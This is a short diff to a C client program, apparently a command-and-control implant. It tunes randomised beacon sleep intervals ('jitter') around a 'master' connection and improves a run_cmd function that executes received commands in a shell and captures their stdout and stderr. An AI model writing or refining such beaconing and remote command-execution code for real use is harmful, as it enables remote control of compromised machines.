@@ -13,10 +13,10 @@ int main(int argc, char **argv){
     master_init(&master);
     while ( 1 ) {
         #ifdef CLIENT_DEBUG
-            int sleep_time = (rand() % 15) + set_sleep;
+            int sleep_time = (rand() % (int)(set_sleep*0.15+1)) + set_sleep;
             printf("Sleeping for %d seconds... ", sleep_time);
         #else
-            int sleep_time = (rand() % SLEEP_MAX) + set_sleep;
+            int sleep_time = (rand() % (int)(set_sleep*0.15+1)) + set_sleep;
         #endif
 
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
@@ -196,6 +196,7 @@ char *run_cmd(char *cmd,char *param) {
     int pipes[2];
     pid_t pid;
     char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
+    bzero(buf, BUF_SIZE);
     if (pipe(pipes)==-1) {
         #ifdef CLIENT_DEBUG
             puts("[run_cmd] Failed to pipe.\n");
@@ -215,6 +216,7 @@ char *run_cmd(char *cmd,char *param) {
         // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
             dup2(pipes[1], STDOUT_FILENO);
+            dup2(pipes[1], STDERR_FILENO);
         #elif __windows__
             _dup2(pipes[1], STDOUT_FILENO);
         #endif
@@ -242,7 +244,7 @@ char *run_cmd(char *cmd,char *param) {
                printf("[run_cmd] CMD ran: %s, Output (%d bytes): %s\n", cmd, nbytes, buf);
             }
         #else
-            read(pipes[0], buf, BUF_SIZE);
+            int nbytes = read(pipes[0], buf, BUF_SIZE);
         #endif
     }
     free(args);
